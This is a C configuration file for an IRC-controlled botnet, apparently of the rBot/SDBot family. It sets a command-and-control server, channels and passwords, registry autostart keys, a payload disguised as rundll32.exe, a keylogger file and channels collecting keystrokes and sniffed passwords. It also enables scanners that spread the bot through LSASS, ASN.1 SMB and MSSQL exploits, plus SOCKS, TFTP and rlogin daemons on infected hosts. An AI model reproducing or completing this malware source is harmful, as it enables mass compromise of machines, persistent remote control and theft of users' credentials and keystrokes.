*/
// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 12522;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 7188;				// Port # for tftp daemon to run on
int httpport = 7088;			// Port # for http daemon to run on
int rloginport = 2292;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "4492";			// cftp port ".lsaport 6969"
char lsuser[] = "dide";
char lspass[] = "eded";

// these have been tested and give best results, DON'T CHANGE!

SCANALL scanall[]={
{"lsass_445", true},
{"asn1smb", true},
{"msqllsass", true},
{NULL, false}
};

//
BOOL sp2_mod = TRUE;				// sp2mod
char botid[] = "<-> Fix your Bug, nmz released by angelo narco and magoz <->";						// bot id
char version[] = "good.. magofarco..n00b..narco.angelo..is team!";		// Bots !version reply
char password[] = "tryagain";					// bot password
char server[] = "server.virtual.it";		// server
char serverpass[] = "t0";						// server password
char channel[] = "#mago";				// channel that the bot should join
char chanpass[] = "keyofchan";						// channel password
char server2[] = "eee.it";						// backup server (optional)
char channel2[] = "xxx";						// backup channel (optional)
char chanpass2[] = "sss";						// backup channel password (optional)
char filename[] = "rundll32.exe";			// destination file name *** your payload should match this too ***
char keylogfile[] = "khghiq.dll";				// keylog filename
char valuename[] = "Microsoft Setup Initializazion";		// value name for autostart
char nickconst[] = "[WIZ]";					// first part to the bot's nick
char szLocalPayloadFile[]="mago.exe";	// **** make this the same as your bot filename! ****
char modeonconn[] = "+xi";					// Can be more than one mode and contain both + and -
char exploitchan[] = "##ano";					// Channel where exploit messages get redirected
char keylogchan[] = "##figa";						// Channel where keylog messages get redirected
char psniffchan[] = "##bocca";						// Channel where psniff messages get redirected

char *authost[] = {
	"*@magozzo.net"
};

char *versionlist[] = {
	"<-> Fix your bug | CUNNEMAMMARUA <->",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now? nono magofarco was here..
#endif
